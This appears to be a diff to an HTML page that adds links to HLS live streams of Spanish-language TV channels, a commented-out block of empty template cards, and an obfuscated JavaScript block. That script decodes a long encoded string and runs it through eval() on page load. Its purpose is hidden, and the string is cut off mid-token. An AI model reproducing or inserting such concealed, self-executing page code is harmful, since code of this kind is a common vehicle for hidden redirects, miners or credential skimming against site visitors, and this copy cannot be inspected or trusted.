+<li> <a href="	https://linear-344.frequency.stream/dist/localnow/344/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i1.sndcdn.com/artworks-000508596741-4txbmm-t500x500.jpg	"/> <h6>	 La Rosa de Guadalupe	</h6></a></li>
+<li> <a href="	https://linear-345.frequency.stream/dist/localnow/345/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://m.media-amazon.com/images/I/51zPX0Ysh8L._UXNaN_FMjpg_QL85_.jpg	"/> <h6>	 La Selecc10n	</h6></a></li>
+<li> <a href="	https://linear-355.frequency.stream/dist/localnow/355/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://image.winudf.com/v2/image/a2lkc3R2LmFieHFfc2NyZWVuXzBfMTUxNjAwMTcyOV8wNTc/screen-0.jpg?h=500&fakeurl=1&type=.jpg	"/> <h6>	 Kids	</h6></a></li>
+<li> <a href="	http://linear-358.frequency.stream/358/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i1.sndcdn.com/avatars-000186182066-y9egbt-t500x500.jpg	"/> <h6>	 CNÑ EN ESPAÑOL VIX	</h6></a></li>
+<li> <a href="	https://linear-358.frequency.stream/dist/localnow/358/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://secure.gravatar.com/avatar/ab2f95de2ce8f7aae58833a466c2cef2?s=500&d=identicon&r=g	"/> <h6>	 CNN Colombia	</h6></a></li>
+<li> <a href="	https://linear-393.frequency.stream/393/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://afiliados.televisa-networks.com/wp-content/uploads/2017/08/televisa-networks-adrenalina-sports-network-logo.jpg	"/> <h6>	Adrenalina Sports	</h6></a></li>
+<li> <a href="	https://televisa-televisa-1-it.samsung.wurl.tv/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://sp-ao.shortpixel.ai/client/to_auto,q_lossy,ret_img,w_1000/https://www.elclarinete.com.mx/wp-content/uploads/2017/11/televisa-.png	"/> <h6>	 Televisa	</h6></a></li>
+<li> <a href="	https://linear-417.frequency.stream/417/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i1.sndcdn.com/artworks-000374160045-m5rrlc-t500x500.jpg	"/> <h6>	 TELEHIT 	</h6></a></li>
+<li> <a href="	https://linear-418.frequency.stream/418/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.ytimg.com/vi/NTAHp2L9GxI/hqdefault.jpg	"/> <h6>	 TELEHIT MUSICA 	</h6></a></li>
+<li> <a href="	https://linear-419.frequency.stream/419/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.ytimg.com/vi/f84fgGlhsXY/hqdefault.jpg	"/> <h6>	 TELEHIT MUSICA PLUS 	</h6></a></li>
+<li> <a href="	https://linear-446.frequency.stream/446/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://i.pinimg.com/736x/d7/64/03/d764036cf9653da6a6fe54c684acde20.jpg	"/> <h6>	Vix	</h6></a></li>
+<li> <a href="	https://linear-451.frequency.stream/451/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://m.media-amazon.com/images/M/MV5BM2I5ZTdmODAtNzRhMS00NWQyLThlYmMtNjhiNDFiZjZhYzZiXkEyXkFqcGdeQXVyNzU2MTAwMTA@._V1_.jpg	"/> <h6>	Nosotros los Guapos	</h6></a></li>
+<li> <a href="	https://estrellanews-roku.amagi.tv/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://www.glewed.tv/wp-content/uploads/2020/10/en-300x450.png	"/> <h6>	 ESTRELLA NEWS 	</h6></a></li>
+<li> <a href="	https://estrellatv-roku.amagi.tv:443/playlistR1080p.m3u8	 " target="_blank"  class="card"> <img src="	https://www.thesfnews.com/wp-content/uploads/2021/03/unnamed.jpg	"/> <h6>	 ESTRELLA Tv	</h6></a></li>
+<li> <a href="	http://ott.cdn.iutpcdn.com/LIVE/H01/CANAL187/PROFILE05.m3u8?	 " target="_blank"  class="card"> <img src="	https://i1.sndcdn.com/avatars-000186182066-y9egbt-t500x500.jpg	"/> <h6>	 CNN ESPAÑOL 	</h6></a></li>
+<li> <a href="	http://linear-192.frequency.stream/192/hls/master/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://radio-corporacion.com/wp-content/uploads/2017/07/512x512bb.jpg	"/> <h6>	  CINE CLUB	</h6></a></li>
+<li> <a href="	https://dip0m6wuccbi7.cloudfront.net/v1/master/3722c60a815c199d9c0ef36c5b73da68a62b09d1/cc-2d8j5h422463p-prod/dist/samsungtv/193/hls/master/playlist.m3u8?ads.device_did=%7BPSID	 " target="_blank"  class="card"> <img src="	https://www.rbr.com/wp-content/uploads/prende-tv.jpg	"/> <h6>	 PRENDE TV LIGA MX	</h6></a></li>
+<li> <a href="	https://tastemade-es8intl-roku.amagi.tv/playlist.m3u8	 " target="_blank"  class="card"> <img src="	https://cigars.roku.com/v1/contain/290x218/https%3A%2F%2Fimage.roku.com%2Fdeveloper_channels%2Fprod%2Fe7011ffa15bec5d3295ff7aa2baf96a5d23b20881f2ddac5761c376909e6eaf6.png	"/> <h6>	 Tastemade en Español	</h6></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+
+
+
+              <!-- 
+
+
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+
+
+
+
+
+
+               -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+
+</ul></center><br>
+<script>
+var _0xc32e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe53c(d,e,f){var g=_0xc32e[2][_0xc32e[1]](_0xc32e[0]);var h=g[_0xc32e[3]](0,e);var i=g[_0xc32e[3]](0,f);var j=d[_0xc32e[1]](_0xc32e[0])[_0xc32e[10]]()[_0xc32e[9]](function(a,b,c){if(h[_0xc32e[4]](b)!==-1)return a+=h[_0xc32e[4]](b)*(Math[_0xc32e[8]](e,c))},0);var k=_0xc32e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc32e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe53c(s,e,10)-t)}return decodeURIComponent(escape(r))}("RLRvRMCvRqLvBRBvRBqvBLLvRLLvRMMvBLLvRMqvMMCvRBCvBRRvBRRvBLBvBRRvRLCvRqRvRRLvRRMvRLBvBRRvBLBvBRRvBLLvMCCvMCBvMCMvMCRvMCqvMCLvMBCvMBBvMBMvRMCvRMBvRMMvRMRvRMqvRMLvRRCvRRBvRRMvRRRvRRqvRRLvRqCvRqBvRqMvRqRvRqqvRqLvRLCvRLBvRLMvRLRvRLqvRLLvqCCvqCBvMMqvMMLvMRCvMRBvMRMvMRRvMRqvMRLvMqCvMqBvMqMvMqRvMqqvMqLvMLCvMLBvMLMvMLRvMLqvMLLvRCCvRCBvRCMvRCRvRCqvRCLvBLCvBLqvBRRvBLBvBRRvRLCvRRLvRRMvRMMvRMqvBRRvBLBvBRRvRRMvRqBvRMRvRMqvRLLvMLCvRMLvBRRvBLBvBRRvBRRvBLBvBRRvBRRvBLBvBRRvBLRvBRRvBLBvBRRvRqRvRqMvRLqvBRRvBLBvBRRvRqLvRMqvRMRvRLMvRMMvRMqvBRRvBLBvBRRvRqLvRMqvRLRvRMqvRqLvRLCvRMqvBRRvBLBvBRRvBLLvBRRvRBMvMBqvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBRBvRBqvBLLvRLLvRMqvMCMvRMMvBqRvRMRvBLBvRMqvBLBvRMLvBqqvqCMvRLRvRMCvRqLvBRBvRRCvMMCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCBvRBMvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvRBMvRBMvBqRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvBqqvMBqvRLRvRMCvRqLvBRBvRRBvMMCvRRCvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCMvRBMvRBMvBqRvBLLvBLBvRMqvBqqvMBqvRLRvRMCvRqLvBRBvRRMvMMCvRRCvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCMvRBMvRBMvBqRvBLLvBLBvRMLvBqqvMBqvRLRvRMCvRqLvBRBvRRRvMMCvRMRvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvRBMvRBMvBqRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvBqqvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvBLLvRBMvRBMvBqRvBqqvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMBMvRBMvRBMvBqRvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBqRvRMCvBLBvRMBvBLBvRMMvBqqvqCMvRRMvRMLvBqRvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCRvRBMvRBMvBqRvRMBvBqqvBRMvMMCvMMCvBLMvMCCvBqqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRMCvBLCvMMCvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCRvRBMvRBMvBqRvRMBvBqqvBqLvBqRvMqqvRMCvRLBvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMBBvRBMvRBMvBqRvRMqvBLBvRMMvBqqvBqqvqCqvBLBvBLLvBqqvMBqvRLRvRMCvRqLvBRBvRRqvMMCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvMBqvRLqvRRBvRRMvRRLvRMqvBqRvRRRvMMBvBLLvBqqvqCMvRRqvMMCvRRMvRBCvRRRvBqCvRMLvRBMvBLCvRRqvMBqvRRRvMMCvBqRvRRRvBLMvBqRvRRRvBqCvRMLvBqqvBqqvBLqvRMLvqCqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRRqvqCRvqCRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvMCCvRBMvqCqvRMqvRLRvRMCvRRLvBqRvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBqRvRRBvBLBvRLMvBLBvRqBvBLBvRLBvBLBvRMqvBLBvRqLvBqqvqCMvRqLvMMCvBRRvBRRvMBqvRMLvRqMvRqLvBqRvRLRvRMCvRqLvBRBvRRMvMMCvBLLvBLBvRRLvRMqvRqBvMMCvRRBvBLRvRRLvRMqvRqBvRRCvRLBvRRBvMBqvRRMvMBLvRRLvRMqvRqBvMBqvRRMvBLCvBLCvBqqvqCMvRLRvRMCvRqLvBRBvRLCvMMCvBRRvBRRvMBqvRLqvRRBvRRMvRRLvRMqvBqRvRRBvRBCvRRMvRBMvBRMvMMCvMMCvRqBvRBCvRMqvRBMvBqqvqCMvRLCvBLCvMMCvRRBvRBCvRRMvRBMvMBqvRRMvBLCvBLCvqCqvRMLvRqMvRqLvBqRvRLRvRMCvRqLvBRBvRRRvMMCvBLLvMBqvRRRvMBLvRqBvBLRvRRLvRMqvRqBvRRCvRLBvRRBvMBqvRRRvBLCvBLCvBqqvRLCvMMCvRLCvBLRvRqLvRMqvRqRvRRLvRMCvRMMvRMqvBqRvRqBvRMqvRLqvBRBvMLRvRMqvRRCvMRMvRLLvRqRvBqRvRqBvRBCvRRRvRBMvBLBvBRRvRRCvBRRvBqqvBLBvRRRvBqqvMBqvRqLvBLCvMMCvMLqvRLBvRqLvRRMvRqBvRRCvBLRvRMLvRqLvRqMvRqCvMRCvRRBvRMCvRqLvMRCvRqMvRMRvRMqvBqRvRBqvBLLvRLLvRMqvMCMvRMMvBqRvRLCvBLBvRMqvBLBvMCCvBLLvBqqvBLMvRLBvBqqvqCqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRMRvRMqvRMMvRqMvRMRvRMqvRCCvMLRvMqCvMRCvRqMvRqCvRqRvRqMvRqBvRMqvRqBvRLBvBqRvRMqvRLCvRMMvRMCvRqRvRMqvBqRvRqLvBqqvBqqvqCqvBqRvBRRvMLLvMLqvMLqvMLqvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRMMvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvMLqvMLqvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLqvRqRvRMMvRMCvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRqRvRqRvRMCvRqRvMLqvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvMLLvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRqRvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvRqRvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvRqRvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvMLqvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLLvRMCvRqRvRqRvRqRvRMCvRqRvMLqvRMCvMLLvMLqvMLqvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvMLLvMLqvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRqRvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvMLLvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLqvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLLvMLqvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvRqRvMLLvRMCvMLLvMLqvMLqvRMMvRMCvMLqvRqRvRMMvRMCvMLqvMLLvMLqvRMCvMLLvRqRvRMMvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLqvMLLvMLqvRMCvMLqvRqRvMLLvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvMLqvMLLvRMCvMLLvMLqvMLqvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLLvMLqvMLLvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvMLLvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRMMvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLqvRqRvRMMvRMCvMLqvRqRvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLqvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLLvMLqvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvRqRvMLLvRMCvMLLvMLqvMLqvRMMvRMCvMLqvRqRvRMMvRMCvMLqvMLLvMLqvRMCvMLLvMLqvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvMLqvMLqvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLqvMLLvMLqvRMCvMLqvRqRvMLLvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLqvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRMMvMLLvMLqvRMCvMLLvRqRvRqRvMLLvRMCvMLLvMLLvMLqvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLLvRMMvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLqvRqRvRMMvRMCvMLqvMLLvMLqvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLqvMLLvMLqvRMCvMLqvRqRvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvRqRvMLLvRMMvRMCvRqRvRqRvRqRvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvRqRvRMMvMLqvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvRMMvRMCvRqRvRqRvRqRvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLqvRqRvRqRvRMCvMLqvRqRvRqRvRMCvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRqRvRqRvRMCvRqRvMLqvRMCvMLqvRqRvRMMvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvMLqvRqRvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvMLqvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLLvRqRvRqRvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRMMvMLLvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLqvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRMMvMLLvMLqvRMCvMLLvRqRvRqRvMLLvRMCvMLLvMLLvMLqvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLLvRMMvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLqvRqRvRMMvRMCvMLqvMLLvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLqvMLLvMLqvRMCvMLqvRqRvMLLvRMCvMLLvMLLvRqRvRqRvRMCvRqRvMLLvRMMvRMCvMLLvMLqvRMMvMLLvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRqRvRMMvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLLvRqRvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLqvMLLvRMMvRMCvMLqvRMMvRMMvRMMvRMCvMLqvRMMvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvRqRvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvMLqvRMCvRqRvRMMvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvMLLvMLqvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRqRvRMMvRMCvMLLvRqRvMLqvRMMvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLLvMLqvMLLvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvMLLvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRMMvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLqvRqRvRMMvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvMLqvRqRvMLLvRMCvML